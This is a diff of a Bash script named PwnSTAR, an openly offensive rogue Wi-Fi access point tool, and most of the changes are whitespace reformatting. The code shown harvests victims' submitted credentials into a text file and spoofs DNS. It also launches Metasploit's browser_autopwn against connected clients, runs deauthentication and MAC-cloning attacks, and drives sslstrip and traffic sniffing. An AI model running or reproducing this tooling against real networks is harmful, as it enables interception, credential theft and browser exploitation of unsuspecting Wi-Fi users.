@@ -871,24 +868,24 @@ apache_fn()
 
 tail_txtfile_fn()
 {
-	echo -e "$q\nDo you want to tail the credentials txtfile? (y/n)"
-	read txttail
-	if [[ $txttail = y ]];then
+    echo -e "$q\nDo you want to tail the credentials txtfile? (y/n)"
+    read txttail
+    if [[ $txttail = y ]];then
         echo -e "$def\n"
-		ls /var/www/$wwwdir
-		echo -e "$q\nEnter name of txtfile \n(usually formdata.txt)"
-		read txtfile
-		var="$(ls /var/www/$wwwdir|grep "$txtfile")" # tests whether $txtfile is valid 
-		if [[ $var == "$txtfile" ]];then
-			Eterm -g 80x4-0+493 --pointer-color "dark orange" -f DarkOrchid4 -b LightYellow1 -r --font-fx none --buttonbar 0  --scrollbar 0 -q -T "Textfile Tail" -e tail -f /var/www/"$wwwdir"/"$txtfile" 2> /dev/null &
-		else 
-			echo -e "$warn\nBad typing - $txtfile doesn't exist"
-			sleep 1
-			tail_txtfile_fn
-		fi
+        ls /var/www/$wwwdir
+        echo -e "$q\nEnter name of txtfile \n(usually formdata.txt)"
+        read txtfile
+        var="$(ls /var/www/$wwwdir|grep "$txtfile")" # tests whether $txtfile is valid 
+        if [[ $var == "$txtfile" ]];then
+            Eterm -g 80x4-0+493 --pointer-color "dark orange" -f DarkOrchid4 -b LightYellow1 -r --font-fx none --buttonbar 0  --scrollbar 0 -q -T "Textfile Tail" -e tail -f /var/www/"$wwwdir"/"$txtfile" 2> /dev/null &
+        else 
+            echo -e "$warn\nBad typing - $txtfile doesn't exist"
+            sleep 1
+            tail_txtfile_fn
+        fi
     elif [[ $txttail != n ]];then
         tail_txtfile_fn
-	fi
+    fi
     sleep 1
     echo -e "$info\nWeb Server attack running" 
 }
@@ -903,7 +900,7 @@ dns_fn()
     if [[ $var = 1 ]];then
         echo -e "$info\nStarting DNS spoofing..."
         Eterm -g 80x6-0+373 -f DarkOrchid4 --pointer-color "dark orange" -b LightYellow1 --font-fx none --buttonbar 0  --scrollbar 0 -q -T "DNSspoof" -e dnsspoof -i at0 2> /dev/null & 
-	elif [[ $var = 2 ]];then
+    elif [[ $var = 2 ]];then
         echo -e "$q\nFor the hosts file
     1) I will supply it
     2) Let's make one"
@@ -937,7 +934,7 @@ dns_fn()
             echo -e "$warn\nBad choice. Start again"
             sleep 2
             dns_fn
-    	fi
+        fi
         echo -e "$info\nStarting DNS spoofing..."
         Eterm -g 80x6-0+373 --pointer-color "dark orange" -f DarkOrchid4 -b LightYellow1 --font-fx none --buttonbar 0  --scrollbar 0 -q -T "DNSspoof" -e dnsspoof -i at0 -f $dnspath 2> /dev/null & 
     elif [[ $var != 1 && $var != 2 ]];then
@@ -1040,8 +1037,8 @@ browser_autopwn_fn()
     iptables -t nat -A PREROUTING -i at0 -j REDIRECT
     service apache2 stop
     sleep 0.5
-    echo -e "$info\nMetasploit starting..."	
-	cat /dev/null > /tmp/br_autopwn.rc > /dev/null # clear pre-existing karma.rc
+    echo -e "$info\nMetasploit starting..."     
+    cat /dev/null > /tmp/br_autopwn.rc > /dev/null # clear pre-existing karma.rc
     echo "use auxiliary/server/browser_autopwn" > /tmp/br_autopwn.rc
     echo "set LHOST $ap_ip" >> /tmp/br_autopwn.rc
     echo "set SRVHOST 0.0.0.0" >> /tmp/br_autopwn.rc
@@ -1063,8 +1060,8 @@ the victim will not get internet access,
 and will probably disconnect)"
     sleep 16
     echo -e "$info\nWait..."
-	sleep 60
-	adv_final_fn
+    sleep 60
+    adv_final_fn
 }
 
 # ~~~~~~~~~~ Advanced Functions ~~~~~~~~~~ #
@@ -1093,8 +1090,8 @@ adv_usage_fn()
     z) Return to basic menu
     "
     read apusage
-	if [[ $apusage = q ]];then
-		exit_fn
+    if [[ $apusage = q ]];then
+        exit_fn
     elif [[ $apusage = z ]];then
         first_fn
     elif [[ $apusage != a && $apusage != b && $apusage != c && $apusage != d && $apusage != e ]];then
@@ -1110,8 +1107,8 @@ adv_usage_fn()
             else
                 adv_usage_fn
             fi
-		fi
-	fi
+                fi
+        fi
     service apache2 stop &> /dev/null
     setup_fn
 }
@@ -1418,7 +1415,7 @@ fi" > /tmp/ipmac
 deauth_presets_fn()
 {
     if [[ -z $deauthchan ]];then    # default to AP channel, unless deauth channel has already been set
-        deauthchan=$apchan	
+        deauthchan=$apchan      
     fi
     if [[ -z $time ]];then          # ditto for time
         time="0"
@@ -1485,21 +1482,21 @@ Aireplay-ng Deauth Setup:
         read time
         aireplaydeauth_setup_fn;;
         
-        c) 	if [[ -z "$tarbssid" || -z $deauthchan || -z $ap_mac || -z $time ]];then
+        c) if [[ -z "$tarbssid" || -z $deauthchan || -z $ap_mac || -z $time ]];then
                 echo -e "$warn\nWake up - you haven't filled all required parameters"
                 sleep 3
                 aireplaydeauth_setup_fn
-            fi;;
+           fi;;
             
         *) aireplaydeauth_setup_fn
     esac
-}	
+}       
 
 mondeauth_start_fn()
 {
     if [[ -z $mondeauth ]];then
-		echo -e "$info\nStarting new monitor interface for deauth..."    # new mon interface to avoid changing AP channel
-		mondeauth=$(airmon-ng start $API|grep enabled|awk '{ print $5"" }'|cut -c -4)
+        echo -e "$info\nStarting new monitor interface for deauth..."    # new mon interface to avoid changing AP channel
+        mondeauth=$(airmon-ng start $API|grep enabled|awk '{ print $5"" }'|cut -c -4)
         sleep 2
         dev_check_var=$mondeauth
         dev_check_fn
@@ -1508,10 +1505,10 @@ mondeauth_start_fn()
             initial_scan_fn
         fi
 
-		echo -e "$info\nMacchanging $mondeauth..." ### would we ever want to set the mac manually?
+        echo -e "$info\nMacchanging $mondeauth..." ### would we ever want to set the mac manually?
         ifconfig $mondeauth down && macchanger -m $ap_mac $mondeauth && ifconfig $mondeauth up
-		sleep 2
-	fi
+        sleep 2
+        fi
     
 }
    
@@ -1526,8 +1523,8 @@ aireplaydeauth_fn()
         echo -e "$warn\n\n\nWITHIN eterm,$info press ctrl-C to stop the continuous deauth\n\nCtrl-C again to close the window"
         sleep 12
     fi
-}	
-	
+}       
+        
 MDK3_fn()
 {
     echo -e "$q\nAre we:
@@ -1560,7 +1557,7 @@ airdrop_fn()
     # You may need to edit this depending how/which airdrop is installed
     # I find airdrop very easy to break - be careful!
     #echo -e "$warn\nRead the script to check the path to airdrop-ng"  
-   # sleep 1
+    # sleep 1
     echo -e "$info\nWe need a rules file"
     sleep 0.5 
     echo -e "$info\nThe format is:
@@ -1676,20 +1673,20 @@ final_fn()
             esac;;
             
         3)  if [[ $apusage != 4 ]];then
-				echo -e "$warn\nOption not available (in this attack mode)"
-				sleep 2
-				final_fn
-			fi
-			if [[ $internet = n ]];then
-				echo -e "$warn\nNo can do - no internet!"
-				sleep 2
-				final_fn
-			fi
-				
-			echo -e "$warn\nThis assumes you are already serving an appropriate webpage\n
+                echo -e "$warn\nOption not available (in this attack mode)"
+                sleep 2
+                final_fn
+            fi
+            if [[ $internet = n ]];then
+                echo -e "$warn\nNo can do - no internet!"
+                sleep 2
+                final_fn
+            fi
+                    
+            echo -e "$warn\nThis assumes you are already serving an appropriate webpage\n
 To allow the victim internet access, dnsspoof will be stopped,\ntherefore new connections to the AP will not see the webpage\n
 If you want multiple connections, start again with the advanced menu options"
-			sleep 0.5
+            sleep 0.5
             echo -e "$info\nThere are better ways of doing this in the advanced menu"
             sleep 1 
             echo -e "$info\nStopping dnsspoof..."
@@ -1777,11 +1774,11 @@ adv_final_fn()
  
            
         3)  if [[ $apusage = 6 ]];then
-				echo -e  "$warn\nOption not available"
-				sleep 2
-				adv_final_fn
-			fi
-			sniff_fn
+                                echo -e  "$warn\nOption not available"
+                                sleep 2
+                                adv_final_fn
+                        fi
+                        sniff_fn
             adv_final_fn;;
             
         4)  echo -e "$info\nStopping dnsspoof..."
@@ -1798,41 +1795,41 @@ adv_final_fn()
 exit_fn()
 {
     clear
-	echo -e "$info\nStopping processes...\n"
-	killall -q tail airbase-ng ferret sslstrip aireplay-ng airodump-ng dhcpd dnsspoof metasploit incrond &> /dev/null
+    echo -e "$info\nStopping processes...\n"
+    killall -q tail airbase-ng ferret sslstrip aireplay-ng airodump-ng dhcpd dnsspoof metasploit incrond &> /dev/null
     sleep 0.5
     killall -q Eterm &> /dev/null 
-	echo -e "$info\nClearing files...\n"
+    echo -e "$info\nClearing files...\n"
     rm /tmp/ip/ip &> /dev/null
     rmdir /tmp/ip &> /dev/null
     rm /tmp/custom.hosts &> /dev/null
     rm /tmp/sslstrip &> /dev/null
 
     # rm /var/spool/incron/root &> /dev/null ###
-	service apache2 stop
+    service apache2 stop
     echo -e "$info"
     service incron stop
-	echo "0" > /proc/sys/net/ipv4/ip_forward
+    echo "0" > /proc/sys/net/ipv4/ip_forward
     echo -e "$info\n\nStopping monitor interfaces...\n"
     airmon-ng stop $monap &> /dev/null
-	airmon-ng stop $monscan &> /dev/null
+    airmon-ng stop $monscan &> /dev/null
     airmon-ng stop $mondeauth &> /dev/null
-	
-	iptables --flush    # delete all rules in default (filter) chains
+        
+    iptables --flush    # delete all rules in default (filter) chains
     iptables -t nat --flush
-	iptables -t mangle --flush
+    iptables -t mangle --flush
     iptables -X         # delete user-defined chains
     iptables -t nat -X
-	iptables -t mangle -X
-	clear
-	echo -e "\e[1;37m\nGood-bye from the PwnSTAR!
-	
-	
-	"
+    iptables -t mangle -X
+    clear
+    echo -e "\e[1;37m\nGood-bye from the PwnSTAR!
+        
+        
+    "
     sleep 3
     echo -e "\e[0m"     # reset colours
     clear
-	exit 0
+    exit 0
 
 }
 # ~~~~~~~~~~ Main Script 2 lines!!! ~~~~~~~~~~ #
